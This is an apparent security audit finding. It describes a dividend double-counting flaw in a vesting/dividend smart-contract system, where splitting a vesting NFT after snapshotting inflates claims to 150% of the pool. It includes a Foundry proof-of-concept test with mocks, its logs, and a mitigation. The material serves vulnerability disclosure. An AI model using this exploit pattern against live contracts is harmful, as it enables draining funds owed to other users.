# [000728] Manipulation of Dividend Share via TVS Splitting Allows Double Counting and Insolvency
  
  ### Summary

Users can exploit the `splitTVS` feature in the Vesting contract to double-count their equity in the Dividend Distributor. The Distributor caches the "unclaimed amount" (numerator) for each NFT ID in the `unclaimedAmountsIn` mapping. This value persists until explicitly updated.
A user can snapshot their high balance, split their NFT (creating a new ID while reducing the balance of the old ID), and then snapshot the new ID. The Distributor will calculate rewards for both the stale high balance of the old ID and the fresh balance of the new ID. This allows the user to claim significantly more dividends than they are entitled to (e.g., 150%), draining the contract and causing insolvency.

### Root Cause

The vulnerability arises from the persistence of state in `A26ZDividendDistributor.sol` and the lack of synchronization with the Vesting contract during a split.
* Stale State: `getUnclaimedAmounts` updates `unclaimedAmountsIn[nftId]` based on the Vesting contract's current state.
* Public Access: Any user can call `getUnclaimedAmounts` to snapshot their balance.
```solidity
function getUnclaimedAmounts(uint256 nftId) public returns (uint256 amount) { //@> Public accessibility allows anyone to snapshot their unclaimed amounts and exploit fee calculations
        if (address(token) == address(vesting.allocationOf(nftId).token)) return 0; 
        uint256[] memory amounts = vesting.allocationOf(nftId).amounts; 
```
* No Invalidation: The `splitTVS` function in AlignerzVesting creates a new NFT and modifies the old one but does not trigger any update in the Distributor to invalidate the cached `unclaimedAmountsIn` for the original NFT.
```solidity
    function splitTVS(
        uint256 projectId,
        uint256[] calldata percentages,
        uint256 splitNftId
    ) external returns (uint256, uint256[] memory) { //@> creates a new NFT and modifies the old one but does not trigger any update in the Distributor to invalidate cached data
        address nftOwner = nftContract.extOwnerOf(splitNftId);
        require(msg.sender == nftOwner, Caller_Should_Own_The_NFT());
```



### Internal Pre-conditions

1. The Admin has called `setAmounts` (snapshotting the denominator).

2. The User owns a Vesting NFT.

### External Pre-conditions

None

### Attack Path

A. Setup: User owns NFT A with 1000 Tokens. Admin initializes a dividend pool of 1000 USDC.
B Snapshot 1: User calls `A26ZDividendDistributor::getUnclaimedAmounts()` on NFT A.
  * `unclaimedAmountsIn[]` NFT Ais set to 1000.
  * Split: User calls `AlignerzVesting::splitTVS()` to split token equally.
  * NFT A reduces to 500 Tokens.
  * NFT B is minted with 500 Tokens.

C. Snapshot 2: User calls `A26ZDividendDistributor::getUnclaimedAmounts()` on NFT B.
  * `unclaimedAmountsIn[]` on NFT B is set to 500.
  *  `unclaimedAmountsIn[]` on NFT A remains 1000 (Stale).

D. Distribution: Admin calls `A26ZDividendDistributor::setDividends()`.
  * The contract sums the numerators: 1000 (A) + 500 (B) = 1500.
  * The contract calculates payouts: 1500 / 1000 * Pool = 150% of Pool.
  * The user claims 1500 USDC from a 1000 USDC pool. If the contract lacks funds, it reverts (DoS). If it has excess funds (from other users), the attacker steals them.

### Impact

1. Attackers can drain dividends meant for other users.

2. Insolvency: The contract liabilities exceed its assets, permanently locking the mechanism if the gap cannot be covered.

### PoC

The following test was run and produced these logs:
```bash
Ran 1 test for test/PoC.t.sol:DoubleCountingPoC
[PASS] testDoubleCountingViaSplit() (gas: 376429)
Logs:
  Original Pool:    1000
  User Received:     1500000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.91ms (2.50ms CPU time)

Ran 1 test suite in 26.72ms (3.91ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
``` 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {A26ZDividendDistributor} from "../src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol";
import {IAlignerzNFT} from "../src/interfaces/IAlignerzNFT.sol";
import {IAlignerzVesting} from "../src/interfaces/IAlignerzVesting.sol";
import {MockUSD} from "../src/MockUSD.sol";

// Mock Vesting to simulate the result of a Split
contract MockVestingSplit is IAlignerzVesting {
    address public tokenAddr;
    
    // Dynamic state to simulate splitting
    mapping(uint256 => uint256) public mockAmounts;

    constructor(address _token) { tokenAddr = _token; }

    function setAmount(uint256 nftId, uint256 amount) external {
        mockAmounts[nftId] = amount;
    }

    // Bypasses Integration Failure by returning full struct from the interface type
    function allocationOf(uint256 nftId) external view returns (IAlignerzVesting.Allocation memory alloc) {
        alloc.token = IERC20(tokenAddr);
        
        alloc.amounts = new uint256[](1);
        alloc.amounts[0] = mockAmounts[nftId]; 
        
        alloc.vestingPeriods = new uint256[](1);
        alloc.vestingPeriods[0] = 100 days; 
        alloc.vestingStartTimes = new uint256[](1);
        alloc.vestingStartTimes[0] = block.timestamp; 
        
        // Use 1 second to bypass Infinite Loop bug
        alloc.claimedSeconds = new uint256[](1);
        alloc.claimedSeconds[0] = 1; 
        
        alloc.claimedFlows = new bool[](1);
        return alloc;
    }

    function claimRewardTVS(uint256) external {}
    function claimTokens(uint256, uint256) external {}
}

contract MockNFTSplit is IAlignerzNFT {
    uint256 public totalMinted;
    function setTotalMinted(uint256 _total) external { totalMinted = _total; }
    function getTotalMinted() external view returns (uint256) { return totalMinted; }
    function extOwnerOf(uint256) external pure returns (address) { return address(0xBEEF); }
    function mint(address) external returns (uint256) { return 0; }
    function burn(uint256) external {}
    function addMinter(address) external {}
}

contract DoubleCountingPoC is Test {
    A26ZDividendDistributor public distributor;
    MockVestingSplit public vesting;
    MockNFTSplit public nft;
    MockUSD public stablecoin;
    MockUSD public token;
    
    address public user = address(0xBEEF);

    function setUp() public {
        stablecoin = new MockUSD();
        token = new MockUSD();
        nft = new MockNFTSplit();
        vesting = new MockVestingSplit(address(token));

        distributor = new A26ZDividendDistributor(
            address(vesting),
            address(nft),
            address(stablecoin),
            block.timestamp, 
            100 days,        
            address(0) 
        );
        
        // Setup 1000 Initial Balance
        stablecoin.mint(address(distributor), 1000 ether);
    }

    function testDoubleCountingViaSplit() public {
        // 1. Setup Initial State
        nft.setTotalMinted(1);
        vesting.setAmount(0, 1000 ether);

        // 2. Admin Snapshots Total (1000)
        distributor.setAmounts(); 

        // 3. User Snapshots NFT 0 (1000)
        distributor.getUnclaimedAmounts(0);

        // 4. User Splits (NFT 0 -> 500, NFT 1 -> 500)
        vesting.setAmount(0, 500 ether);
        vesting.setAmount(1, 500 ether);
        nft.setTotalMinted(2);

        // 5. User Snapshots NFT 1 (500)
        distributor.getUnclaimedAmounts(1);
        
        // State is now:
        // Denominator: 1000 (Original Total)
        // Numerator 0: 1000 (Stale)
        // Numerator 1: 500  (New)
        // Total Numerator: 1500.
        // Payout Ratio: 150% of Pool.

        // 6. Admin Distributes
        distributor.setDividends();

        // 7. Warp to end
        vm.warp(block.timestamp + 100 days + 1);

        
        // The contract owes 1500 but only has 1000. 
        // To assert the math works (and doesn't just revert), we add 500 extra tokens now.
        // This simulates "stealing from other users" if the pool had more funds.
        stablecoin.mint(address(distributor), 500 ether);
        // -------------------------

        // 8. Claim
        vm.startPrank(user);
        distributor.claimDividends(); 
        
        uint256 balance = stablecoin.balanceOf(user);
        console.log("Original Pool:    1000");
        console.log("User Received:    ", balance);

        // Assert user got 1500 (150% of original pool)
        assertEq(balance, 1500 ether, "User exploited double counting to claim 150%");
    }
}
```

### Mitigation

Make `getUnclaimedAmounts` internal so users cannot selectively update state.
  